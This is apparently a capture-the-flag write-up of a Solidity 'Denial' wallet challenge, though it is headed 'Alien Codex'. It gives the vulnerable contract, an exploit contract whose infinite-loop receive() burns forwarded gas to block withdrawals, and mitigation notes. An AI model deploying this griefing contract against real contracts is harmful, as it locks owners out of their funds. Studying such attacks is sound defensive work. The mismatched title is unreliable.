# Alien Codex

## Challenge Description

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner;
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances;

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        partner.call{ value: amountToSend }("");
        payable(owner).transfer(amountToSend);
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    receive() external payable {}

    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Challenge Solution Walkthrough

In the `withdraw()` function, a low-level `call` function is used, which forwards `63/64` of the available gas to the external contract. However, it's important to note that if all of the forwarded gas is consumed during the execution, the remaining `1/64` amount of gas may not be sufficient to complete the computation.

To exploit this vulnerability, we can deploy a separate contract that interacts with the target contract. Here is the contract code for the exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialSolution {
    Denial public denial;

    constructor(address denialAddress) {
        denial = Denial(payable(denialAddress));
    }

    function solveChallenge() public {
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}
```

In this contract, when the `solveChallenge()` function is called, we set the exploit contract as the "partner" of the target contract by invoking the `setWithdrawPartner()` function. Then, when the `withdraw()` function is called, it executes the line of code `partner.call{value: amountToSend}("");`, which triggers the `receive()` function in our exploit contract and consumes `63/64` of the total gas available. Inside the `receive()` function, an infinite loop is used to consume all available gas, preventing the execution from completing.

As a result, no other party can successfully call the `withdraw()` function because the remaining `1/64` amount of gas is not sufficient to finish the computation, effectively denying access to the funds.

By deploying the exploit contract and calling the `solveChallenge()` function, we successfully exploit the vulnerability and prevent anyone else from withdrawing funds from the target contract.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

_Note_: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
